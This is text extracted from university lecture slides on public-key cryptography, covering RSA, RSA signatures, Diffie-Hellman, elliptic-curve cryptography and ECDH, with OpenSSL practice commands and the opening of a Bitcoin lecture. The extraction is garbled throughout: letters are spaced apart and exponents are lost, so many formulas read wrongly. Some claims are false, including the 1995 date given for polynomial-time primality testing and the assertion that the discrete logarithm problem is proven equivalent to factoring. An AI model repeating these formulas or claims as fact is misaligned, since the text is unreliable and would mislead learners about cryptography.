Reduced Set of Residues Ø The RSA algorithm is based on a small amount of number theory. Ø The reduced set of residues (RSR) of a number n i s the set of all integers which have an inverse mod n . – In ot h e r w or d s , a l l t he n u m b e r s a wi t h: gcd (a, n) = 1 E.g., RSR of 10 = {1, 3, 7, 9} – RSR of prime p = {1, 2, ..., p - 1 }


<!-- Page 388 -->

Euler Totient Function Ø The Euler Totient Function f is the size of this set. – f ( 10 ) = 4 . • f ( p ) = p - 1 , wh e re p i s p r i m e . • f ( p q ) =(p - 1 )(q - 1 ) , w h e r e p , q a re p r i m e . • f ( pqr ) =(p - 1)(q - 1)(r - 1) , where p , q,r are prime. Ø This second result can be proved by counting. – T h e re a re pq - 1 n u m b e rs i n t he r a nge 1 .. pq - 1


<!-- Page 389 -->

Euler Totient Function Ø We do not want factors of p : p,2p,...,(q - 1)p – Thus , h e re a re q - 1 of t h ese . Ø S i m il a r ly , t h e r e a re p - 1 f ac t o r s o f q . Ø T h e re a re no n u m b e rs w i t h f a c to rs p an d q : f ( pq ) = (pq - 1) - (q - 1) - (p - 1) = pq - p - q+1 = (p - 1)(q - 1)


<!-- Page 390 -->

Fermat’s Little Theorem Ø I f p i s p r i m e a nd gcd ( a,p ) = 1 , then a p - 1 % p = 1 Ø Proof from Euler's generalization, which follows next. Ø Euler's Generalization of Fermat's Theorem a f (n) % n = 1 , provided gcd(a, n) = 1 Ø Proof beyond the scope of this course.


<!-- Page 391 -->

A Probabilistic Primality Test Ø Le t a b e a p r i m e nu m b e r. § If a n - 1 % n ¹ 1 , t h e n n i s NOT p r i m e . § If a n - 1 % n = 1 , then n m ay be a prime, or the result may be 1 by accident . Ø Choose a series of prime numbers a , and calculate a n - 1 % n . § If the answer is 1 in all cases, then we can assume that n prime with a small probability of error. Ø Carmichael's numbers are not prime but always pass this test. § There are not many of them.


<!-- Page 392 -->

Exponentiation Ciphers Ø The RSA public key system is a form of exponentiation cipher, so we will consider exponentiation ciphers first. Ø The Plaintext Input Ø Let us choose an integer n a nd split the plaintext into a series of blocks P i with 0 £ P i < n. Ø I w i l l d r o p t he i s uf f i x f rom n ow o n a nd j u s t c o n s i d e r w h a t happens to one block.


<!-- Page 393 -->

Exponentiation Ciphers Ø Encryption – Choose an integer e and calculate the cipher text C = P e % n Ø Decryption – Choose an integer d a nd recover the message by P = C d % n Ø d a n d e m u s t b e in v e r s e s , s o t h a t – de º 1 mod f (n) – Hence de = 1 + l f ( n) for some integer l . – We don’t need to know what l is. – Also, gcd (d, f (n)) = 1 for the inverse to exist. – Therefore, d is the unique inverse of e .


<!-- Page 394 -->

Proof C = P e % n (Ciphertext C: encrypt plaintext P) P' = C d % n ( Plaintext P’ = decrypt ciphertext P) à We want to show: P’ = P P' = C d % n = P ed % n = P 1 + l f (n) % n = P* P l f (n) % n = P* (P f (n) % n) l % n = P, since P f (n) % n = 1 and (1 l % n = 1) By Euler's generalisation of Fermat's theorem, assuming gcd ( P, n ) =1 .


<!-- Page 395 -->

Rivest Shamir Adleman (RSA ) Scheme Ø Choose n = pq , the product of two primes. Ø T h e n f = ( p - 1)(q - 1 ) w h i c h c a n on l y b e ca l c ul a t e d i f n i s factored . – We h a v e t o k n ow b o t h p a nd q t o ca l c ul a t e f . Ø This is safe provided our enemies cannot factor n into two primes. Ø gcd ( P,n ) m a y n o t be 1 i f P h a s e i t h e r p o r q a s a f ac t o r . – So, the encryption fails because Euler’s generalisation does not apply . Ø The values of p and q are so large that this is very unlikely and can be ignored .


<!-- Page 396 -->

Difficulty of Factoring Ø Factoring is not known to be NP - complete. – Primality testing is similar to factoring. A polynomial - time algorithm for primality testing was discovered in 1995. – There is no - known polynomial time algorithm for factoring. Ø The best general - purpose factoring algorithm is O(n Ö (log log n / log n) ) Ø This would involve about 10 15 operations for a 100 - digit number.


<!-- Page 397 -->

RSA Security Ø Security depends on the difficulty of factoring n: § Factor n => F (n) => compute d from (e, F (n)) Ø The length of n= pq reflects the strength § 700 - bit n factored in 2007 § 768 bit factored in 2009 Ø 1024 bit for a minimal level of security today § Likely to be breakable in the near future § Minimal 2048 bits recommended for current usage Ø NIST suggests 15360 - bit RSA keys are equivalent in strength to 256 - bit Ø RSA speed is quadratic in key length


<!-- Page 398 -->

Ø Often used to encrypt a symmetric key – To encrypt a message M under a public key ( n,e ), generate a new AES key K , compute [RSA( n,e,K ), AES(K,M)] Ø Original RSA is not secure enough and often needs padding, e.g., Optimal Asymmetric Encryption Padding (OAEP) – Roughly, to encrypt M, choose random r, and encode M as: M’ = [X = M Å H 1 (r),Y= r Å H 2 (X)] where H 1 and H 2 are cryptographic hash functions, then encrypt it as (M’) e mod n – Note that given M’=[X,Y], r = Y Å H 2 (X), and M = X Å H 1 (r) Real - world Usage


<!-- Page 399 -->

Summary Ø RSA algorithm – How to generate the key pair Public key: pk=(e, n); Private key: sk =(d, n) – How to encrypt using the public key Compute ciphertext C = M e mod n – How to decrypt using the private key Compute M’ = C d mod n = (M e mod n) d mod n = M ed mod n = M


<!-- Page 400 -->

Quizzes Describe the RSA public key encryption system and show how it works when prime numbers 5 and 7 are used to construct the modulus n = 35. - Choose an encryption parameter e and calculate the corresponding decryption parameter d. - Use these values to encrypt the plaintext value 17 and decrypt the resulting ciphertext to recover the plaintext.


<!-- Page 401 -->

Digital Signature


<!-- Page 402 -->

Recall: Key pairs • Instead of sharing a key between pairs of parties ... • ...every party has a pair of keys – public key: published for the world to see – private key: kept secret and never shared


<!-- Page 403 -->

Encryption Digital Signatures Public key Encryption key Verification key Private key Decryption key Signing key Key - pair Terminolog y


<!-- Page 404 -->

How does Digital Signatures work? How does Digital Signatures work ?


<!-- Page 405 -->

Ø Digital Signature: a data string which associates a message with some originating entity. One party generates a signature, and many parties can verify. Ø Digital Signature Scheme: • a signing algorithm: takes a message and a (private) signing key, outputs a signature • a verification algorithm: takes a (public) key verification key, a message, and a signature Ø Provides: • Authentication, Data integrity, Non - Repudiation Digital Signature Scheme


<!-- Page 406 -->

A digital signature scheme is a triple (Gen, Sign, Ver): - Gen( len ): generate a key pair ( pk,sk ) of length len - Sign(m; sk ): sign message m with private key (i.e., signing key) sk , producing signature s as output - Ver(m, s; pk): verify signature s on message m with public key (i.e., verification key ) pk Sign Digital Signature Scheme


<!-- Page 407 -->

Ø Very often digital signatures are used with hash functions, a hash of a message is signed, instead of the message. Ø The hash function must be: § Pre - image resistant § Weak collision resistant § Strong collision resistant Digital Signature and Message Digest


<!-- Page 408 -->

Key generation (as in RSA encryption): 1. Select 2 large prime numbers of about the same size: p and q 2. Compute n = pq , and F = (q - 1)(p - 1) 3. Select a random integer e, 1 < e < F s .t. gcd (e, F ) = 1 4. Compute d, 1 < d < F s .t. ed º 1 mod F Public key: (e, n) used for verification Secret key: (d, n) used for generation RSA Digital Signature


<!-- Page 409 -->

Signing message M § Verify 0 < M < n § Compute S = M d mod n Verifying signature S § Use public key (e, n) § Compute S e mod n = (M d mod n) e mod n = M Note: in practice, a hash of the message is signed and not the message itself. RSA Digital Signature


<!-- Page 410 -->

Ø Core ideas are the same as RSA encryption Ø Common mistake: “RSA sign = encrypt with private key” Ø In practice, outside of textbooks: § There's a core RSA function R that works with either pk or sk § RSA encrypt = do some prep work on m then call R with pk § RSA sign = do different prep work on m then call R with sk § Prep work (padding): “original RSA is insecure” § For encryption: OAEP § For signatures: PSS (probabilistic signature scheme) § Also, need to handle long messages … RSA Digital Signature


<!-- Page 411 -->

Ø DSA: Digital Signature Algorithm [ Kravitz 1991] § Standardized by NIST and made available royalty - free in 1991/1993 § Used for decades without any serious attacks § Closely related to Elgamal encryption RSA Digital Signature


<!-- Page 412 -->

Digital Signatures and Digital Certificates


<!-- Page 413 -->

Summary ► Digital Signature based on RSA: A triple (Gen, Sign, Ver) ► Gen( len ): generate a key - pair (pk, sk ) ► Sign(m; sk ): sign a message m with private key sk , output signature s ► Ver(m, s; pk) :verify signature s with public key pk


<!-- Page 414 -->

Tutorials / Practice OpenSSL is an amazing tool that does a variety of tasks, including encrypting files. 1. Using OpenSSL to generate key pair: Alice generates her keys $ openssl genrsa - aes128 - out alice_private.pem 1024 à Generating the private key $ openssl rsa - in alice_private.pem - pubout > alice_public.pem à Extracting the associated public key To view the keys: $ openssl rsa - in alice_private.pem - noout - text


<!-- Page 415 -->

OpenSSL is an amazing tool that does a variety of tasks, including encrypting files. 2. Bob sends his public key to Alice $ scp bob_public.pem alice@alice - machine - or - ip :/path/ 3. Alice encrypts a file using Bob public key $ openssl rsautl - encrypt - inkey bob_public.pem - pubin - in top_secret.txt - out top_secret.enc (Note: some newer versions of openssl use pkeyutl instead of rsautl ) Tutorials / Practice


<!-- Page 416 -->

OpenSSL is an amazing tool that does a variety of tasks, including encrypting files. 4. Alice sends the ciphertext (i.e., encrypted file) to Bob $ scp top_secret.enc bob@bob - machine - or - ip :/path/ 5. Bob decrypts the ciphertext using his private key $ openssl rsautl - decrypt - inkey bob_private.pem - in top_secret.enc > top_secret.txt 6. Try many more examples with different keys to see what happens if the key is incorrect Tutorials / Practice


<!-- Page 417 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 418 -->

Lecture 5: Public - key Cryptography


<!-- Page 419 -->

Lecture 5: Review


<!-- Page 420 -->

Outline 1. Overview – Introduction – A Big Picture 2. Diffie Hellman Key Exchange Protocol 3. RSA Public key Cryptography – KeyGen – Encryption / Decryption – Digital Signature 4. Elliptic Curves Cryptography


<!-- Page 421 -->

How Cryptography works Encryption Key Decryption Key Al i c e B o b Trudy Bob’s public key Bob’s private key K pk K sk m m = Dec(Enc( K pk ,m ), K sk ) Enc(m, K pk )


<!-- Page 422 -->

Public - key Cryptography: Requirements Ø Each person owns a key - pair ( K sk , K pk ). K pk revealed to the world; K sk is kept secretly Ø Given Public key K pk , it is impractical to compute the private key K sk Ø Need to design functions Enc and Dec so that: Ø Note that: “ Use public key first (encrypt), followed by private key (decrypt)” AND “Use private key first, followed by public key” should produce the same results. m = Dec( K sk ,Enc ( K pk ,m ))


<!-- Page 423 -->

Diffie - Hellman Summary Ø Diffie Hellman Key Exchange protocol – Public channels can be used to create a confidential shared key function. – A trapdoor/ One - way function should be used • Mix colour example – In practice: we use “ Multiplicative Group” of “Integers modulo p ”, where p is prime, and g is a primitive root modulo p


<!-- Page 424 -->

Diffie - Hellman Summary Ø Multiplicative group of “Integers modulo p” s = g n mod p Ø We have: Easy: given g , n, & p , solve for s Hard: given s , g, & p , solve for n Why? Ø And the property of: g a*b mod p = g b *a mod p


<!-- Page 425 -->

RSA Summary Ø RSA algorithm: 1. How to generate the key pair: Public key: pk =(e, n); Private key: sk =(d, n) 2. How to encrypt using the public key: Compute ciphertext C = M e mod n 3. How to decrypt using the private key: Compute M’ = C d mod n = (M e mod n) d mod n = M ed mod n = M


<!-- Page 426 -->

Digital Signature


<!-- Page 427 -->

Ø Digital Signature: a data string which associates a message with some originating entity. One party generates a signature, and many parties can verify. Ø Digital Signature Scheme: • A public/private key pair generation • A signing algorithm: takes a message and a (private) signing key, outputs a signature • A verification algorithm: takes a (public) key verification key, a message, and a signature Ø Provides: • Authentication, Data integrity, Non - Repudiation Digital Signature Scheme


<!-- Page 428 -->

Encryption Digital Signatures Public key Encryption key Verification key Private key Decryption key Signing key Key - pair Terminology


<!-- Page 429 -->

How does Digital Signatures work? How does Digital Signatures work ?


<!-- Page 430 -->

Digital Signature Scheme Ø Digital Signature based on RSA: A triple (Gen, Sign, Ver) Ø Gen( len ): generate a key - pair (pk, sk ) Ø Sign(m; sk ): sign a message m with private key sk , output signature s Ø Ver(m, s; pk): verify signature s with public key pk


<!-- Page 431 -->

Lecture 5: Elliptic Curve Cryptography


<!-- Page 432 -->

Outline Ø Elliptic Curves Cryptography 1. Basic Elliptic Curves 2. Addition and Multiplication on Elliptic Curve 3. Elliptic Curves Discrete Logarithm Problem (ECDLP) 4. Elliptic Curves Diffie Hellman (ECDH) 5. Elliptic Curve Digital Signature Algorithm (ECDSA ) Ø Reading Session


<!-- Page 433 -->

Trapdoor /One - way Function Ø In Diffie - Hellman Key Exchange Protocol: – Discrete Logarithm Problem s = g n mod p – Without modular arithmetic operation s = g n Ø In RSA: – Factoring problem – Choose n = pq , the product of two primes. – T h e n f = ( p - 1)(q - 1 ) w h i c h c a n on l y b e ca l c ul a t e d i f n i s factored . • We h a v e t o k n ow b o t h p a nd q t o ca l c ul a t e f . Ø In Elliptic Curve???


<!-- Page 434 -->

Alice Bob Pick a secret , random x from F Pick secret, random y from F B = g y mod p A = g x mod p Compute: k =( g y ) x = g xy mod p Compute: k =( g x ) y = g xy mod p Trudy knows p,g , A and B She has to compute k from A and B without knowing x and y … She faces the Discrete Logarithm Problem in finite fields F={ 1,2,3,…,p - 1} Discrete Logarithms in Finite Fields


<!-- Page 435 -->

Security of Diffie Hellman Ø The Diffe - Hellman algorithm relies on the hardness of the discrete logarithm problem for its security. Ø The discrete logarithm problem states that if we know p, g and public key A = g x % p , then it is computationally infeasible to calculate the private key a . Ø It can be shown that this problem is equivalent to the factoring problem. – If a fast algorithm for factoring is discovered then there exists an equivalent fast algorithm for solving the discrete logarithm problem, and vice versa.


<!-- Page 436 -->

1. Basic Elliptic Curve


<!-- Page 437 -->

Elliptic Curves Ø Basic Elliptic Curves: 𝑦 ! = 𝑥 " + 𝐴𝑥 + 𝐵 (4A 3 + 27B 2 ≠ 0 ) ( Weierstrass Form ) Ø The values 𝐴 , 𝐵 , 𝑥 , 𝑦 come from some sets, usually a field


<!-- Page 438 -->

Elliptic Curves Ø Elliptic Curves are different from Ellipse


<!-- Page 439 -->

Elliptic Curve in Bitcoin Elliptic Curve used in Bitcoin 𝑦 ! = 𝑥 " + 7 - This is a graph of secp256k1's elliptic curve y 2 = x 3 + 7 over the real numbers . - Note that because secp256k1 is defined over the finite field Z p , its graph will in reality look like random scattered points, not anything like this. https://en.bitcoin.it/wiki/Secp256k1


<!-- Page 440 -->

Definition of EC Ø An elliptic curve over a field L is a non - singular cubic curve in two variables, f( x,y ) =0 with a rational point (which may be a point at infinity). Ø The field L is usually taken to be the complex numbers, reals, rationals , algebraic extensions of rationals , p - adic numbers, or a Finite Field . Ø Elliptic curves groups for cryptography are examined with the underlying fields of F p (where p>3 is a prime) and F 2 m (a binary representation with 2 m elements).


<!-- Page 441 -->

EC on a Finite Set of Integers Ø Consider y 2 = x 3 + 2x + 3 ( mod 5 ) x = 0 Þ y 2 = 3 Þ no solution (mod 5) x = 1 Þ y 2 = 6 = 1 Þ y = 1,4 (mod 5) x = 2 Þ y 2 = 15 = 0 Þ y = 0 (mod 5) x = 3 Þ y 2 = 36 = 1 Þ y = 1,4 (mod 5) x = 4 Þ y 2 = 75 = 0 Þ y = 0 (mod 5) Ø Then points on the elliptic curve are: (1,1) (1,4) (2,0) (3,1) (3,4 ) ( 4,0) and the point at infinity: ¥ Ø Using finite fields, we can form an Elliptic Curve Group for public - key cryptography where we have a trapdoor function as the DLP problem.


<!-- Page 442 -->

Points on Elliptic Curve Ø Elliptic Curve over field L Ø Forms an Abelian group Ø Symmetric about the x - axis Ø Points of the curve: 𝑃 = 𝑥 , 𝑦 with 𝑥 , 𝑦 ∈ 𝐿 and a point ∞ § Point at infinity ∞ acting as the Identity Element in Abelian group 2 3 ( ) { } {( , ) | ... ...} E L x y L L y x = ¥ È Î ´ + = +


<!-- Page 443 -->

2. Addition and Multiplication on Elliptic Curve


<!-- Page 444 -->

The Abelian Group Ø Abelian group: a set of elements together with an operation (+) to form another element. Here, given two points P, Q in E ( Fp ) , there is a third point, denoted by P+Q on E ( Fp ) Ø The following relations hold for all P,Q,R in E ( Fp ): 1. P + Q = Q + P ( commutativity ) 2. P + Q) + R = P + (Q + R) ( associativity ) 3. P + O = O + P = P ( existence of an identity element ) 4. There exists ( − P) s.t − P + P = P + ( − P) = O ( existence of inverses )


<!-- Page 445 -->

The Abelian Group Ø Consider elliptic curve EC: y 2 = x 3 - x + 1 Ø If P 1 and P 2 are on EC , we can define P 3 = P 1 + P 2 as shown in the picture. Ø Addition operation (+) is all we need P 1 P 2 P 3 x y


<!-- Page 446 -->

Addition of two Points on EC x y y=m(x - x 1 )+y 1 y 2 =x 3 +Ax+B Consider two points P and Q P = x ! , y ! , Q = ( x " , y " ) R = ( P + Q ) = ( x # , y # )


<!-- Page 447 -->

Ø P and Q are added to obtain P+ Q , which is a reflection of R along the x - axis Addition of two Points on EC


<!-- Page 448 -->

Ø Using our definition of Addition : 1. P + Q is well defined 2. P + Q = Q + P 3. P +(Q + R) = (P + Q) + R 4. P + O = P 5. - P = P # (O # O) https://blog.cloudflare.com/a - relatively - easy - to - understand - primer - on - elliptic - curve - cryptography Addition of two Points on EC


<!-- Page 449 -->

Doubling a Point on EC Ø In case P = Q, we have 2𝑦 𝑑𝑦 𝑑𝑥 = 3 𝑥 " + 𝐴 ⇒ 𝑚 = 𝑑𝑦 𝑑𝑥 = 3 𝑥 ! " + 𝐴 2 𝑦 ! 𝐼𝑓 , 𝑦 ! ≠ 0 ( since then P ! + P " = ∞ ) : 0 = 𝑥 # − 𝑚 " 𝑥 " + . . . ⇒ 𝑥 # = 𝑚 " − 2 𝑥 ! , 𝑦 # = 𝑚 ( 𝑥 ! − 𝑥 # ) − 𝑦 !


<!-- Page 450 -->

Ø We define mP : • 2P = P + P • 3P = P + P + P • m P = P + P + … + P m : o rder of P - No matter how big m is, there is an efficient way to calculate m P . - It is also called Scalar Multiplication on EC Multiplication of a Point


<!-- Page 451 -->

Multiplication of a Point Ø A tangent at P is extended to cut the curve at a point; its reflection is 2P . Adding P and 2P gives 3P Ø Similarly, such operations can be performed as many times as desired to obtain Q = mP


<!-- Page 452 -->

3 . Elliptic Curve Discrete Log Problem (ECDLP)


<!-- Page 453 -->

EC Discrete Log Problem Ø Combined with “ Integer mod p ” Ø ECDLP : Begin with an EC mod p , let P be a point and let Q be a multiple of P: Q = mP . The ECDLP is to find the value of m given Q and P . Ø We can simply calculate 2P, 3P, 4P , etc. But if p and m are large numbers, this could take trillions of years (Exponential running time ) Ø Until now, we do not know of a fast way to solve ECDLP .


<!-- Page 454 -->

Example: EC mod 541 EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 455 -->

Example: EC mod 541 EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 456 -->

Example: EC mod 541 EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 457 -->

Example: EC mod 541 EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 458 -->

Example: EC mod 541 EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 459 -->

Elliptic Curve Discrete Log Problem (ECDLP) EC: y 2 = x 3 – x with p = 541 , point P = (10, 80)


<!-- Page 460 -->

Elliptic Curve Diffie - Hellman


<!-- Page 461 -->

4. Elliptic Curve Diffie - Hellman (ECDH)


<!-- Page 462 -->

EC Discrete Log Problem Ø There is an efficient way to calculate the multiplication on EC: Q = mP , given m and P Ø The ECDLP is to find the value of m , given Q and P s.t Q = m P § Basically, we do not know of a fast way to solve ECDLP . Ø This will be good for the trapdoor function (with modular p ) § m will be the secret information, Q and P and the modulus prime p can be publicly available


<!-- Page 463 -->

ECDH Key Exchange Protocol Ø Alice and Bob desire to establish a shared secret key k . Ø Alice and Bob agree on an EC , a large prime p (called the multiplicative order), and a point B on the curve (called the Generator or the Base - point) § Called Domain Parameters Ø Trud y knows the curve, the point, and the prime number p


<!-- Page 464 -->

ECDH Key Exchange Protocol Ø Alice secretly picks a large number p A . Bob secretly picks a large number p B . Alice computes Q A = p A B ; Bob computes Q B = p B B . They exchange the points Q A and Q B . § p: private key § Q = pB : public key Ø Alice computes p A Q B = p A p B B . Bob computes p B Q A = p B p A B . Both use the x - value of p A p B B for the key k . Ø The shared secret key k is then used for symmetric encryption such as DES and AES


<!-- Page 465 -->

ECDH Example 1. Let’s use y 2 = x 3 – x with p = 541, B = (10, 80). 2. Alice picks p A = 20 . Bob picks p B = 103. 3. Q A = 20 x ( 10, 80) = (519, 241). 4. Q B = 103 x ( 10, 80) = (85, 345). 5. When Alice gets Q B , she finds 20xQ B = (353, 158). 6. When Bob gets Q A , he finds 103xQ A = (353, 158). 7. They both use k = 353 for their secret key .


<!-- Page 466 -->

Diffie - Hellman : Finite Fields and ECs Alice Bob Choose b ∈ ! { 0 , … , 𝑞 − 1 } 𝐴 = 𝑔 " ( mod 𝑝 ) Choose a ∈ ! { 0 , … , 𝑞 − 1 } 𝐵 = 𝑔 # ( mod 𝑝 ) Compute: 𝐾 = 𝐴 # ( mod 𝑝 ) Compute: 𝐾 = 𝐵 " ( mod 𝑝 ) Same 𝐾 : 𝐴 # = ( 𝑔 " ) # = 𝑔 "# = ( 𝑔 # ) " = 𝐵 " Alice Bob Choose b ∈ ! { 0 , … , 𝑞 − 1 } 𝐴 = a 𝑃 Choose a ∈ ! { 0 , … , 𝑞 − 1 } 𝐵 = b 𝑃 Compute: 𝐾 = a 𝐵 Compute: 𝐾 = b 𝐴 Same 𝐾 : b 𝐴 = ba 𝑃 = ab 𝑃 = a 𝐵


<!-- Page 467 -->

Why ECC 1. ECC: Shorter key - length Symmetric Key Length Standard Asymmetric Key Length Elliptic Curve Key Length 80 1024 160 112 2048 224 128 3072 256 192 7680 384 256 15360 512


<!-- Page 468 -->

Why ECC 1. ECC: Shorter key - length 2. Fast Computation ( keyGen and Digital Signature) What are the disadvantages of ECC? 1. ECDLP is not mature yet! Might have an unknown weakness 2. Heavily rely on RNG – If RNG is compromised, then the key can be figured out


<!-- Page 469 -->

5 . Elliptic Curve Reading Session


<!-- Page 470 -->

Reading List 1. https ://en.wikipedia.org/wiki/Elliptic_Curve_Digit al_Signature_Algorithm 2. https ://en.bitcoin.it/wiki/Elliptic_Curve_Digital_S ignature_Algorithm 3. https ://www.cs.miami.edu/~burt/learning/Csc609. 142/ecdsa - cert.pdf – This file is uploaded on Moodle as well


<!-- Page 471 -->

Summary Ø Elliptic Curves Cryptography § Basic Elliptic Curves § Addition and Multiplication on Elliptic Curve § Elliptic Curves Discrete Logarithm Problem (ECDLP) § Elliptic Curves Diffie Hellman (ECDH)


<!-- Page 472 -->

Experiment with OpenSSL command line Ø OpenSSL contains a large set of pre - defined curves that can be used. The full list of built - in curves can be obtained through the following command: $ openssl ecparam - list_curves Ø An EC Parameters file contains all of the information necessary to define an Elliptic Curve that can then be used for cryptographic operations (for OpenSSL this means ECDH and ECDSA): $ openssl ecparam - name secp256k1 - out secp256k1.pem


<!-- Page 473 -->

Ø Keys can be generated from the ecparam command, either through a pre - existing parameters file or directly by selecting the name of the curve. To generate a key pair from a pre - existing parameters file use the following : $ openssl ecparam - in secp256k1.pem - genkey - noout - out secp256k1 - key.pem Ø Or to do the equivalent operation without a parameters file use the following: $ openssl ecparam - name secp256k1 - genkey - noout - out secp256k1 - key. pem Experiment with OpenSSL command line


<!-- Page 474 -->

Ø Remember, the command generates the keypair, both private and public keys. $ openssl ecparam - in secp256k1.pem - genkey - noout - out secp256k1 - key.pem ” Ø The public key can be obtained using this command : $ openssl ec - in ecprivkey.pem - pubout - out ecpubkey.pem Ø Just take a look at the key file, which contains both information on private and public keys (and the curve as well ): $ openssl ec – in secp256k1 - key.pem - noout - text Experiment with OpenSSL command line


<!-- Page 475 -->

Ø Information on the parameters that have been used to generate the key ar e embedded in the key file itself. $ openssl ecparam - in secp256k1.pem - text - noout Ø This will simply confirm the name of the curve in the parameters file. If you wish to examine the specific details of the parameters associated with a particular named curve then this can be achieved as follows : $ openssl ecparam - in secp256k1.pem - text - param_enc explicit - noout Experiment with OpenSSL command line


<!-- Page 476 -->

Bitcoin, Cryptocurrencies, and Blockchain technology 1. Bitcoin & Cryptocurrencies 2. Blockchain Technology 3. Security and Privacy in Bitcoin and Cryptocurrencies 1 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 477 -->

Lecture 5 - Review CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 478 -->

Main points to take home ► A big picture of Public key Cryptography ► A party owns a key pair (Public key, Private key) ► Encrypt using Public key, decrypt using Private key ► Diffie Hellman Key Exchange protocol o Public channel can be used to create a confidential shared key function. o One - way operation should be used o Mix colour example o In practice: we use multiplicative group of integers modulo p, where p is prime, and g is a primitive root modulo p CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 3


<!-- Page 479 -->

Main points to take home ► Diffie Hellman Key Exchange protocol ➢ Multiplicative group of “Integers modulo p” s = g n mod p ➢ We have: Easy: given g, n, & p , solve for s Hard: given s, g, & p , solve for n ➢ And the property of: g a*b mod p = g b *a mod p CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 4


<!-- Page 480 -->

RSA Summary ► RSA algorithm ► How to generate the key pair Public key: pk=(e, n); Private key: sk =(d, n) ► How to encrypt using the public key Compute ciphertext C = M e mod n ► How to decrypt using the private key Compute M’ = C d mod n = (M e mod n) d mod n = M ed mod n = M CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 5


<!-- Page 481 -->

Main points to take home ► Digital Signature based on RSA: A triple (Gen, Sign, Ver) ► Gen( len ): generate a key - pair (pk, sk ) ► Sign(m; sk ): sign a message m with private key sk , output signature s ► Ver(m, s; pk) :verify signature s with public key pk CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 6


<!-- Page 482 -->

Main points to take home ► Digital Signature based on RSA: A triple (Gen, Sign, Ver) ► Gen( len ): generate a key - pair (pk, sk ) ► Sign(m; sk ): sign a message m with private key sk , output signature s ► Ver(m, s; pk) :verify signature s with public key pk CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 7


<!-- Page 483 -->

Main points to take home ➢ Elliptic Curves Cryptography ▪ Basic Elliptic Curves 𝑦 2 = 𝑥 3 + 𝐴𝑥 + 𝐵 (4A 3 + 27B 2 ≠ 0)( Weierstrass Form ) ▪ Elliptic Curve for Cryptography = Elliptic Curve over a Finite Field L: E(L) ▪ Combine with “ Integer mod p ”, P is a prime number to form a Finite Field 8 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2 3 ( ) { } {( , ) | ... ...} E L x y L L y x =     + = +


<!-- Page 484 -->

Main points to take home ➢ Elliptic Curves Cryptography ▪ Addition and Multiplication on Elliptic Curve ▪ How we define P + Q over E(L) ▪ How we define mP = P + P + … + P over E(L) ▪ Elliptic Curves Discrete Logarithm Problem (ECDLP) ▪ Elliptic Curves Diffie Hellman (ECDH ) 9 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 485 -->

Main points to take home ➢ Elliptic Curves Discrete Logarithm Problem (ECDLP) ▪ There is efficient way to calculate the multiplication on EC: Q = mP , given m and P ▪ The ECDLP is to find the value of m, given Q and P that Q = m P ▪ Basically, we do not know of a fast way to solve ECDLP. ▪ This will be good for the trapdoor function (with modular p) ▪ m will be the secret information, Q and P and the modulus prime p can be publicly available 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 486 -->

Main points to take home ➢ Elliptic Curves Diffie Hellman Key Exchange ▪ Alice and Bob desire to establish a shared secret key k . ▪ Alice and Bob agree on an EC, a large prime p (called the multiplicative order), and a point B on the curve (called the Generator or the Base - point) ▪ Called Domain Parameters ▪ Eve knows the curve, the point, and the prime number 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 487 -->

Main points to take home ➢ Alice secretly picks a large number p A .Bob secretly picks a large number p B . Alice computes Q A = p A B . Bob computes Q B = p B B . They exchange the points Q A and Q B . ▪ p: private key ▪ Q = pB : public key ➢ Alice computes p A Q B = p A p B B . Bob computes p B Q A = p B p A B . Both use the x value of p A p B B for the key k . ➢ The shared secret key k is then used for symmetric encryption such as DES and AES 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 488 -->

Lecture 6: Bitcoin, Cryptocurrencies, and Blockchain technology CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 13


<!-- Page 489 -->

Outline 1. Bitcoin & Cryptocurrencies ◦ Decentralised Payment System: A Big Picture ◦ Cryptography in Bitcoin ◦ Bitcoin Protocol: an Overview 2. Blockchain Technology ▪ Bitcoin Addresses ▪ Bitcoin Distributed Ledger: a Blockchain ▪ Transactions in Bitcoin and Blockchain ▪ Consensus Mechanism: Proof - of - Work 3. Security and Privacy in Bitcoin and Blockchain CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 14


<!-- Page 490 -->

